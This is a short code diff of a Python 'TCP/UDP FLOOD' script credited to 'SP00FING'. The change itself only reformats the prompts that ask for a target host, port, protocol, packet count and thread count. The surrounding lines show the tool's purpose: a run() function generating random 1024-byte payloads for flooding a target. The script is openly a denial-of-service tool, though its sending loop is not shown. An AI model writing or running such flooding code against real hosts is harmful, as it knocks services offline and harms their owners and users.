@@ -5,11 +5,11 @@ import threading
 
 print("--> C0de By SP00FING <--")
 print("#-- TCP/UDP FLOOD --#")
-ip = str(input(" Host/Ip :"))
-port = int(input(" Port :"))
-choice = str(input(" UDP (y/n ) :"))
-times = int(input(" Packets Per One Connection :"))
-threads = int(input(" Threads :"))
+ip = str(input("Host/Ip : "))
+port = int(input("Port : "))
+choice = str(input("UDP ( y / n ) : "))
+times = int(input("Packets Per One Connection : "))
+threads = int(input("Threads : "))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
